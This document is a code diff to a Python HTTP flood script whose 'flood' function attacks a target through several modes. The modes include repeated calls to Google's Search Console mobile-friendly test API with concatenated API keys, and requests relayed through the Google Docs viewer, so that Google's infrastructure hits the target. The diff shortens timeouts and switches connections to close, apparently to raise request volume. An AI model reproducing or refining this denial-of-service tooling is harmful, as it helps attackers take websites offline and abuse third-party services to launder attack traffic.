@@ -23,7 +23,7 @@ def randomurl():
 def flood(target,domainname,attack,sock):
     headers = {
     "X-Requested-With": "XMLHttpRequest",
-    "Connection": "keep-alive",
+    "Connection": "close",
     "Pragma": "no-cache",
     "Cache-Control": "no-cache",
     "Accept-Encoding": "gzip, deflate, br",
@@ -65,16 +65,16 @@ def flood(target,domainname,attack,sock):
             elif attack =='head':
                 r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
             elif attack =='googleapi':
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key2, data=datapost, headers=headers, timeout=20)
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key3, data=datapost, headers=headers, timeout=20)
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key4, data=datapost, headers=headers, timeout=20)
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key5, data=datapost, headers=headers, timeout=20)
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key6, data=datapost, headers=headers, timeout=20)
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key7, data=datapost, headers=headers, timeout=20)
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key8, data=datapost, headers=headers, timeout=20)
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key9, data=datapost, headers=headers, timeout=20)
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key10, data=datapost, headers=headers, timeout=20)
-                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key11, data=datapost, headers=headers, timeout=20)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key2, data=datapost, headers=headers, timeout=4)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key3, data=datapost, headers=headers, timeout=4)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key4, data=datapost, headers=headers, timeout=4)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key5, data=datapost, headers=headers, timeout=4)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key6, data=datapost, headers=headers, timeout=4)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key7, data=datapost, headers=headers, timeout=4)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key8, data=datapost, headers=headers, timeout=4)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key9, data=datapost, headers=headers, timeout=4)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key10, data=datapost, headers=headers, timeout=4)
+                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key11, data=datapost, headers=headers, timeout=4)
             elif attack =='google':
                 r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=15)
             elif attack =='delete':
